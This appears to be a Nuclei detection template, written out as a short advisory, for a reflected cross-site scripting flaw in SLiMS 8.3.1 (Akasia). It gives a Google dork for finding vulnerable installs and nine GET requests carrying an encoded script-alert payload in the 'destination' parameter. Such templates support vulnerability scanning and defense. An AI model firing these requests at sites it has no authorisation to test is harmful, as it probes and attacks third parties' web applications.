# Nuclei Template: Senayan Library Management System v8.3.1 (Akasia) - Cross-Site Scripting
**Template ID:** slims-8-akasia-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`slims-8-akasia-xss.yaml`)

## Vulnerability Information & PoC

## Description
SLiMS 8.3.1 (Akasia) has a `destination` parameter that is vulnerable to reflected XSS. However, ensure that the `p` parameter points to the 'member'. Additional google dork 'intext:"SLiMS 8.3.1 (Akasia)"'.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
GET {{BaseURL}}/perpustakaan/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
GET {{BaseURL}}/slims/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
GET {{BaseURL}}/perpustakaan/slims/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
GET {{BaseURL}}/e-library/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
GET {{BaseURL}}/perpus/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
GET {{BaseURL}}/digilib/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
GET {{BaseURL}}/akasia/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
GET {{BaseURL}}/library/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member
```

## References
- https://github.com/slims/slims8_akasia/issues/184
